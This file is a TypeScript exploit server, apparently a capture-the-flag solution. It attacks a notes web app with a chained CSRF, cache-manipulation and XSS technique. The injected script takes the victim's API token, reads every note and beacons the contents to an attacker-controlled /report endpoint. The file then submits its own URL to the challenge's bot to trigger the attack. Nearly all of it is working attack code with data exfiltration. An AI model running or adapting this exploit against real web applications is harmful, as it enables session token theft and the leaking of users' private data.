import { Hono } from "hono";

const app = new Hono()

const CHALL_HOST = "http://localhost:3000"
const _INTERNAL_CHALL_HOST = "http://localhost:3000"
// const _INTERNAL_CHALL_HOST = "http://web:3000"
const ATTACKER_HOST = "http://localhost:1337"

app.get('/', (c) => {
  console.log("Connected")
  return c.html(`<!DOCTYPE html>
    <html lang="en">
    <body>
      <script>
        (async function () {
          function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
          }
          // 1. get a valid session
          const w = window.open(\`${ATTACKER_HOST}/attack?\${new URLSearchParams({
            payload: '<svg onload="window.addEventListener(\`message\`,e=>(new Function(e.data))())">'
          })}\`)
        })()
      </script>
    </body>
    </html>
    `)
})

app.get('/back', (c) => {
  console.log("Backing, wait receiving...")
  return c.html(`<script>history.go(-${parseInt(c.req.query('n') ?? '2')})</script>`)
})

app.get('/attack', (c) => {
  console.log("Start Attack", c.req.queries())
  return c.html(`
    <div id="x">
    <script>
    (async function () {
      function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
      }
      // 2. CSRF use delete endpoint to create payload
      const params = new URLSearchParams(location.search);
      const XSSpayload = params.get("payload")
      const payloadId = XSSpayload + '.html'
      const form = document.createElement('form')
      form.action = "${_INTERNAL_CHALL_HOST}/api/notes/delete"
      form.method = "POST"
      // use a target to request in a new window
      form.target = "_blank"
      const input = document.createElement('input')
      input.name = "noteId"
      input.value = payloadId
      form.appendChild(input)
      x.appendChild(form)
      form.submit()
      // 3. disable bfcache by opening a window without setting it's opener to null, navigate to deleted note in advance
      const w = window.open(\`${_INTERNAL_CHALL_HOST}/api/notes/\${payloadId}\`)
      await sleep(200)
      // 4. navigate to index to get disk cache
      w.location = "${_INTERNAL_CHALL_HOST}"
      await sleep(800)
      // 5. retrieve page from disk cache, enjoy XSS
      w.location = "${ATTACKER_HOST}/back?n=2"
      await sleep(2000)
      const evilJs = \`(async () => {
  navigator.sendBeacon("${ATTACKER_HOST}/report", "Staring exploit...");
  const { token } = await (await fetch("/api/token")).json()
  const noteIds = await (
    await fetch("/api/notes", {
      headers: { "X-Token": token },
    })
  ).json()
  const notes = await Promise.all(
    noteIds.map((id) =>
      fetch("/api/notes/" + id, {
        headers: { "X-Token": token },
      }).then((res) => res.text())
    )
  )
  navigator.sendBeacon("${ATTACKER_HOST}/report", notes.join(","));
})()\`;
      w.postMessage(evilJs, '*');
    })()
  </script>`)
})

app.post('/report', async (c) => {
  console.log("Received: ", await (await c.req.blob()).text())
  return c.text("ok")
})

Bun.serve({
  port: 1337,
  fetch: app.fetch
})

await fetch(`${CHALL_HOST}/report`, {
  method: 'POST',
  body: JSON.stringify({
    url: ATTACKER_HOST
  }),
  headers: {
    'Content-Type': 'application/json'
  }
})
